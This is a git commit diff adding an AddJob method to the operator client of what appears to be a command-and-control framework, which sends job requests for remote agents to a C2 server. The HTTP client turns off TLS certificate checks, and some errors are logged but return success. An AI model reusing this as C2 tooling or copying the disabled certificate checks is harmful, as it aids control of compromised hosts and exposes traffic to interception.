72664523f120377dd164a128d227e6472bd02ed6
whatsyourask <lexeymartynov@gmail.com>
2024-05-05 17:11:23 +0300

    Added a method AddJob for operator's side

--- c2/c2.go
+++ c2/c2.go
@@ -9,6 +9,8 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+
+	"github.com/google/uuid"
 )
 
 type C2Module struct {
@@ -104,8 +106,50 @@ func (c2m *C2Module) getAgents() []transport.Agent {
 	return respJson
 }
 
-func (c2m *C2Module) AddJob(agentUuid string) {
-
+func (c2m *C2Module) AddJob(agentUuid string) error {
+	uuid := uuid.New()
+	jobUuid := uuid.String()
+	addJobPostBody := map[string]string{"agent-uuid": agentUuid, "job-uuid": jobUuid}
+	addJobPostJson, err := json.Marshal(addJobPostBody)
+	if err != nil {
+		return fmt.Errorf("can't marshal a json for POST login: %v", err)
+	}
+	req, err := http.NewRequest("POST", c2m.apiUrl+"/agents/job/add", bytes.NewBuffer(addJobPostJson))
+	if err != nil {
+		return fmt.Errorf("can't create a POST request: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+c2m.authorizationToken)
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		c2m.logger.Log.Errorf("can't perform a POST request: %v", err)
+		return nil
+	}
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		c2m.logger.Log.Errorf("can't do io.ReadAll: %v", err)
+		return nil
+	}
+	var respJson struct {
+		Status string `json:"status"`
+	}
+	err = json.Unmarshal(respBody, &respJson)
+	if err != nil {
+		c2m.logger.Log.Errorf("can't unmarshal a JSON in response: %v", err)
+		return nil
+	}
+	if respJson.Status == "ok" {
+		return nil
+	} else if respJson.Status == "agent not found" {
+		return fmt.Errorf("there is no such agent")
+	} else {
+		return fmt.Errorf("can't add a job to the agent")
+	}
 }
 
 func (c2m *C2Module) operatorLogin() error {
